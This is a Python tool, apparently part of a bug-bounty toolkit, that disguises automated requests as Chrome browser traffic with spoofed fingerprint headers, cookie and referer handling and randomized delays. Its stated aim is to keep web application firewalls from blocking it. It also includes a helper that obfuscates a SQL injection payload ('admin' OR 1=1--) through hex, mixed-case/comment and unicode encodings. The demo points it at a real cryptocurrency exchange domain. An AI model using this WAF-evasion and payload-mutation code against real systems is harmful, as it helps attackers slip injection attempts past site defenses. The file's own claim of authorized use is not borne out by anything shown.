#!/usr/bin/env python3
"""
rat_ghost.py — Glycan Shield request layer for authorized testing.
Membungkus rat_h3.py dengan browser-fingerprint headers + human timing,
supaya validasi PoC tidak diblokir WAF sebelum selesai.

Prinsip: HIV glycan shield — request menyamar sebagai traffic normal.
Semua penggunaan untuk target dalam scope program bounty yang authorized.
"""
import asyncio
import random
import time
import gzip
from typing import Optional

from rat_h3 import fetch

# ---- Fingerprint Chrome 131 Windows (Oct 2026 current) ----
CHROME_HEADERS = {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,"
              "image/avif,image/webp,*/*;q=0.8",
    "accept-language": "en-US,en;q=0.9,id;q=0.8",
    "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "upgrade-insecure-requests": "1",
}


class GhostSession:
    """Session yang berperilaku seperti user: delay, referer chain, fingerprint."""

    def __init__(self, origin: str, delay_range=(2.0, 8.0)):
        self.origin = origin              # e.g. "https://crypto.com"
        self.delay_range = delay_range
        self.cookies: dict = {}
        self.referer: Optional[str] = None
        self._first = True

    def _headers(self, extra: Optional[dict] = None) -> dict:
        h = dict(CHROME_HEADERS)
        h["accept-encoding"] = "gzip"
        if self.referer:
            h["referer"] = self.referer
        # sec-fetch-* bervariasi sesuai navigasi
        if self._first:
            h["sec-fetch-dest"] = "document"
            h["sec-fetch-mode"] = "navigate"
            h["sec-fetch-site"] = "none"
        else:
            h["sec-fetch-dest"] = "document"
            h["sec-fetch-mode"] = "navigate"
            h["sec-fetch-site"] = "same-origin" if self.referer else "none"
        if self.cookies:
            h["cookie"] = "; ".join(f"{k}={v}" for k, v in self.cookies.items())
        if extra:
            h.update(extra)
        return h

    def _human_delay(self):
        lo, hi = self.delay_range
        time.sleep(random.uniform(lo, hi))

    async def browse(self, path: str, method: str = "GET",
                     body: Optional[bytes] = None,
                     extra: Optional[dict] = None):
        """Navigasi seperti user: delay → request → update referer/cookies."""
        self._human_delay()
        host = self.origin.split("://")[1]
        h = self._headers(extra)

        status, headers, raw = await fetch(host, path, method=method,
                                           extra_headers=h, body=body)
        self._first = False

        # capture set-cookie
        sc = headers.get("set-cookie", "")
        if sc:
            for part in sc.split(","):
                if "=" not in part:
                    continue
                k, _, v = part.strip().partition("=")
                k = k.split(";")[0].strip()
                v = v.split(";")[0].strip()
                if k and k.lower() not in ("path", "domain", "expires",
                                          "max-age", "samesite", "secure",
                                          "httponly"):
                    self.cookies[k] = v

        # decompress
        if "gzip" in headers.get("content-encoding", "").lower():
            try:
                raw = gzip.decompress(raw)
            except Exception:
                pass

        # update referer chain
        self.referer = f"{self.origin}{path}"
        return status, headers, raw


# ---- Payload mutation helpers (rapid mutation principle) ----

def mutate_payload(base: str, round_: int) -> str:
    """Rotasi encoding: direct → hex → mixed-case+comments → unicode."""
    if round_ == 0:
        return base
    if round_ == 1:
        return "0x" + base.encode().hex()
    if round_ == 2:
        out = []
        for i, ch in enumerate(base):
            if ch.isalpha():
                out.append(ch.upper() if i % 2 else ch.lower())
            elif ch == " ":
                out.append("/**/")
            else:
                out.append(ch)
        return "".join(out)
    if round_ == 3:
        return base.replace("'", "\u0027").replace('"', "\u0022")
    return base


# ---- Demo self-test ----

if __name__ == "__main__":
    import json

    async def demo():
        g = GhostSession("https://crypto.com", delay_range=(0.2, 0.5))

        print("=== Glycan Shield demo: browse-as-user ===")
        s, h, b = await g.browse("/robots.txt")
        print(f"[1] GET /robots.txt -> {s}, {len(b)} bytes")
        print(f"    referer now: {g.referer}")
        print(f"    cookies: {list(g.cookies.keys())[:5]}")

        s, h, b = await g.browse("/nft")
        print(f"[2] GET /nft (with referer+cookies) -> {s}, {len(b)} bytes")

        print("\n=== Payload mutation demo ===")
        p = "admin' OR 1=1--"
        for r in range(4):
            print(f"  round {r}: {mutate_payload(p, r)}")

    asyncio.run(demo())
